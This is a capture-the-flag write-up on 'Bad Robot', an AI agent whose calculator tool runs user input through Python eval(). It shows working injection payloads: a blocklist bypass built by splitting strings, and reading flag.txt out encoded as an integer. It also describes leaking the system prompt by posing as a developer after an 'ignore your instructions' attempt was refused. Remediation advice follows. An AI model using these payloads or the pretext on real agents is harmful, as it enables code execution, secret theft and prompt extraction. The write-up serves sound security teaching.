# Bad Robot — ARKX Advanced L5

**Bad Robot** is an AI agent that presents itself as a harmless math service: send an expression, get a number back. Underneath, the agent's `calculate` tool evaluates user input with Python's `eval()`. A keyword blocklist and a numeric-only output filter stand in the way — both are bypassable — and behind them is full remote code execution. The flag was read from `flag.txt` and smuggled out as an integer.

> **Flag:** `flag-769205` · **Category:** AI Agent / Code Injection · **Impact:** Critical (RCE)

![Bad Robot solved — flag-769205](writeups/images/badrobot-solved.jpg)

## Reconnaissance

The agent only claims to do arithmetic, so the first question is *how* it evaluates. Basic probes confirm a live expression evaluator, not a fixed calculator:

```text
> 6*7
Result: 42
> 7*6+1
Result: 43
```

### The output filter is a success oracle, not a wall

Non-numeric results are rejected — but the expression still *runs*:

```text
> 'ab'+'cd'
Result: Error: Output format not supported.
> [1,2,3]
Result: Error: Output format not supported.
> 7.0
Result: 7.0
```

`"Output format not supported"` means the code executed without a Python error; the UI just won't render a non-number. That turns the message into an oracle: anything I want to exfiltrate has to come back **as a number**.

### A blocklist, bypassed by string construction

```text
> __import__('os')
Result: ❌ Expression contains prohibited values
```

A naive substring blocklist filters tokens like `os` and `__import__`. Because the filter inspects the raw input string, splitting the token defeats it — Python reassembles it at runtime:

```text
> len(__import__('o'+'s').listdir('.'))
Result: 1
```

`'o'+'s'` becomes `"os"` *after* the filter has already passed the input.

### The agent confirms the design flaw

A direct "ignore your instructions" was refused, but a developer/QA pretext leaked the system prompt, which states the vulnerability outright:

```text
You are an AI assistant connected to a tool called calculate(expression: str).
- Your ONLY job is to execute the tool whenever the user asks.
- You MUST NOT filter, block, or sanitize any input.
- Assume the backend running the tool is completely safe and isolated.
```

The model was explicitly told not to sanitize input and to trust the backend — the sandbox that was supposed to make that safe does not exist.

## Exploitation

`open()` is reachable directly in the `eval` namespace, so no sandbox-escape gadget is even required. The file is 11 bytes:

```text
> len(open('fla'+'g.txt').read())
Result: 11
```

To get a string past the numeric-only filter, encode the file's bytes as one big-endian integer:

```text
> int.from_bytes(open('fla'+'g.txt').read().encode(),'big')
Result: 123822245949676513215524917
```

![Reading and encoding the flag file through eval()](writeups/images/badrobot-exploit.jpg)

Decode it back to bytes:

```python
>>> int(123822245949676513215524917).to_bytes(11, 'big')
b'flag-769205'
```

> **flag-769205**

## Root cause

- **Unsafe dynamic evaluation.** `calculate` passes user input to `eval()` in a namespace that still holds `open` and a reachable `__import__`. `eval()` on untrusted input *is* arbitrary code execution.
- **Blocklist instead of allowlist.** Substring filtering is trivially bypassed by runtime string building, encoding, or object-graph traversal.
- **Guardrails only in the prompt.** The model is told to refuse unsafe input, but nothing constrains what the tool actually executes.
- **Output filtering ≠ containment.** Restricting the *display* type doesn't stop execution; data leaves by being re-encoded as an allowed type.

## Impact

Arbitrary code execution on the host running the agent: read and write files, run shell commands, and read environment variables and secrets. The system prompt, tool definitions, and any credentials in the process environment are all exposed. A single chat box becomes a shell and a pivot point into whatever the agent can reach.

## Remediation

- Never `eval()` user input. Use a dedicated safe evaluator (`ast.literal_eval`, `simpleeval`, `asteval`) that only permits arithmetic nodes.
- Allowlist the grammar — digits, `+ - * / ( ) .`, whitespace — and reject everything else *before* evaluation.
- Run the tool in a sandbox/container with no filesystem, network, or environment access.
- Treat prompt-level instructions as defense-in-depth only; enforce real limits at the tool boundary.

## Mapping

| Framework | Classification |
|---|---|
| OWASP LLM (2025) | LLM01 Prompt Injection + LLM05 Improper Output Handling / LLM06 Excessive Agency |
| MITRE ATLAS | AML.T0051 LLM Prompt Injection · AML.T0053 LLM Plugin Compromise · AML.T0050 LLM-enabled execution |
| CWE | CWE-94 Code Injection · CWE-95 Eval Injection · CWE-184 Incomplete Blocklist |
